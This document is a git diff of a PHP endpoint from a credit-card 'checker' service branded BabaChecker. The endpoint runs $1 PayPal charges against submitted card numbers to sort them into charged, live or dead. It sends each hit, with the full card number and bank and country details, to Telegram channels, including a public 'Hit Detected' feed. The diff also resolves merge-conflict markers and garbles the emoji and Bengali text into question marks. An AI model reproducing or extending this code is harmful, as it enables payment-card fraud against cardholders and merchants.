@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted to two levels up
 require_once __DIR__ . '/../../app/Db.php';
@@ -85,7 +85,7 @@ $yearLength = strlen($year);
 if ($yearLength <= 2) {
     $year = "20" . $year;
 }
-// Map month to two digits (UI/endpoint দুটোতেই সেফ)
+// Map month to two digits (UI/endpoint ??????? ???)
 $month = sprintf('%02d', (int)$month);
 // ---------- helpers ----------
 function generateUserAgent() {
@@ -225,34 +225,31 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
     $err = 'Your payment successful';
     $newCredits = updateCredits($pdo, $uid, 5, false, true);
     $fullResult = "<b>#PayPalCharge</b>\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-                  "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
-                  "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
-                  "[ﾒ] <b>Gateway ➜</b> PayPal 1$ CVV\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-                  "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-                  "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-                  "[ㇺ] <b>Dev ➜</b> babachecker";
+                  "???????????\n" .
+                  "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+                  "[?] <b>Status ?</b> Charged ??\n" .
+                  "[?] <b>Response ?</b> {$err} ??\n" .
+                  "[?] <b>Gateway ?</b> PayPal 1$ CVV\n" .
+                  "???????????\n" .
+                  "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+                  "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+                  "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+                  "???????????\n" .
+                  "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+                  "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
-    $publicMessage = "<b>Hit Detected ✅</b>\n" .
-                     "━━━━━━━━\n" .
-                     "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-                     "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
-                     "<b>Response ➜</b> {$err} 🎉\n" .
-                     "<b>Gateway ➜</b> PayPal 1$ CVV\n" .
-                     "━━━━━━━━\n" .
-<<<<<<< HEAD
-                     "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-                     "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+    $publicMessage = "<b>Hit Detected ?</b>\n" .
+                     "????????\n" .
+                     "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+                     "<b>Status ?</b> <b>Charged ??</b>\n" .
+                     "<b>Response ?</b> {$err} ??\n" .
+                     "<b>Gateway ?</b> PayPal 1$ CVV\n" .
+                     "????????\n" .
+                     "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'charge',
@@ -271,31 +268,31 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
     $err = 'CVV2_FAILURE';
     $newCredits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult = "<b>#PayPalCharge</b>\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-                  "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-                  "[ﾒ] <b>Response ➜</b> {$err}\n" .
-                  "[ﾒ] <b>Gateway ➜</b> PayPal 1$ CVV\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-                  "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-                  "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-                  "[ㇺ] <b>Dev ➜</b> babachecker";
+                  "???????????\n" .
+                  "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+                  "[?] <b>Status ?</b> Live ?\n" .
+                  "[?] <b>Response ?</b> {$err}\n" .
+                  "[?] <b>Gateway ?</b> PayPal 1$ CVV\n" .
+                  "???????????\n" .
+                  "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+                  "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+                  "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+                  "???????????\n" .
+                  "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+                  "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
-    // $publicMessage = "<b>Hit Detected ✅</b>\n" .
-    //                  "━━━━━━━━\n" .
-    //                  "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-    //                  "<b>Status ➜</b> <b>Live ✅</b>\n" .
-    //                  "<b>Response ➜</b> {$err} \n" .
-    //                  "<b>Gateway ➜</b> PayPal 1$ CVV\n" .
-    //                  "━━━━━━━━\n" .
-    //                  "<b>Hit From ➜</b> <a href=\"https://babachecker.net\">babachecker</a>";
+    // $publicMessage = "<b>Hit Detected ?</b>\n" .
+    //                  "????????\n" .
+    //                  "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+    //                  "<b>Status ?</b> <b>Live ?</b>\n" .
+    //                  "<b>Response ?</b> {$err} \n" .
+    //                  "<b>Gateway ?</b> PayPal 1$ CVV\n" .
+    //                  "????????\n" .
+    //                  "<b>Hit From ?</b> <a href=\"https://babachecker.net\">babachecker</a>";
     // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -315,31 +312,31 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
     $err = 'INSUFFICIENT_FUNDS';
     $newCredits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult = "<b>#PayPalCharge</b>\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-                  "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-                  "[ﾒ] <b>Response ➜</b> {$err}\n" .
-                  "[ﾒ] <b>Gateway ➜</b> PayPal 1$ CVV\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-                  "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-                  "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-                  "━━━━━━━━━━━\n" .
-                  "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-                  "[ㇺ] <b>Dev ➜</b> babachecker";
+                  "???????????\n" .
+                  "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+                  "[?] <b>Status ?</b> Live ?\n" .
+                  "[?] <b>Response ?</b> {$err}\n" .
+                  "[?] <b>Gateway ?</b> PayPal 1$ CVV\n" .
+                  "???????????\n" .
+                  "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+                  "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+                  "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+                  "???????????\n" .
+                  "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+                  "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
-    // $publicMessage = "<b>Hit Detected ✅</b>\n" .
-    //                  "━━━━━━━━\n" .
-    //                  "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-    //                  "<b>Status ➜</b> <b>Live ✅</b>\n" .
-    //                  "<b>Response ➜</b> {$err} \n" .
-    //                  "<b>Gateway ➜</b> PayPal 1$ CVV\n" .
-    //                  "━━━━━━━━\n" .
-    //                  "<b>Hit From ➜</b> <a href=\"https://babachecker.net\">babachecker</a>";
+    // $publicMessage = "<b>Hit Detected ?</b>\n" .
+    //                  "????????\n" .
+    //                  "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+    //                  "<b>Status ?</b> <b>Live ?</b>\n" .
+    //                  "<b>Response ?</b> {$err} \n" .
+    //                  "<b>Gateway ?</b> PayPal 1$ CVV\n" .
+    //                  "????????\n" .
+    //                  "<b>Hit From ?</b> <a href=\"https://babachecker.net\">babachecker</a>";
     // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -387,8 +384,5 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
         'country_info' => $binInfo['country_info']
     ]);
     exit;
-<<<<<<< HEAD
 }
-=======
-}
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
